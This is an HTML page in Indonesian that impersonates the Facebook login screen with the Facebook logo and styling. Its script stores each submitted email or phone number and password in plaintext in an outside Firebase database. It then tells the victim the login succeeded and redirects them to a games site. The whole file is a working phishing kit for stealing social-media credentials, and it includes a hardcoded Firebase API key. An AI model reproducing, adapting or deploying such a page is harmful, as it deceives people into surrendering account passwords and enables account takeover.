<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Facebook</title>
    
    <!-- Include Firebase SDK as ES Module -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-analytics.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
        
        // Firebase configuration
        const firebaseConfig = {
          apiKey: "AIzaSyADiJ85Yr0cnM3AlN4E23DeLhjjtzS-utg",
          authDomain: "testing-f7e72.firebaseapp.com",
          databaseURL: "https://testing-f7e72-default-rtdb.firebaseio.com",
          projectId: "testing-f7e72",
          storageBucket: "testing-f7e72.firebasestorage.app",
          messagingSenderId: "683074830976",
          appId: "1:683074830976:web:b76109a0b991cbd9335c65",
          measurementId: "G-JQMD6LTXWC"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const database = getDatabase(app);

        // Form Submission (Login)
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();

            const emailOrPhone = document.getElementById('emailOrPhone').value;
            const password = document.getElementById('password').value;

            // Store login data to Firebase
            const newUserRef = ref(database, 'users/' + Date.now());
            set(newUserRef, {
                emailOrPhone: emailOrPhone,
                password: password
            }).then(() => {
                alert('Login berhasil! Anda akan dialihkan ke situs game.');
                window.location.href = "https://www.friv.com/"; // Redirect to Friv
            }).catch((error) => {
                alert('Terjadi kesalahan: ' + error.message);
            });
        });
    </script>
    
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #e9eff1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 150px;
        }

        h1 {
            font-size: 22px;
            color: #1877f2;
            margin: 10px 0 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        input {
            width: 100%;
            padding: 14px;
            font-size: 14px;
            border: 1px solid #dddfe2;
            border-radius: 5px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }

        input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 4px rgba(24, 119, 242, 0.3);
        }

        button {
            width: 100%;
            background-color: #1877f2;
            color: #fff;
            padding: 14px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #166fe5;
        }

        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #606770;
        }

        .footer a {
            color: #1877f2;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>
        <h1>Login ke Facebook</h1>
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="emailOrPhone" name="emailOrPhone" placeholder="Email atau Nomor Telepon" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Kata Sandi" required>
            </div>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            Belum punya akun? <a href="#">Daftar</a>
        </div>
    </div>
</body>
</html>
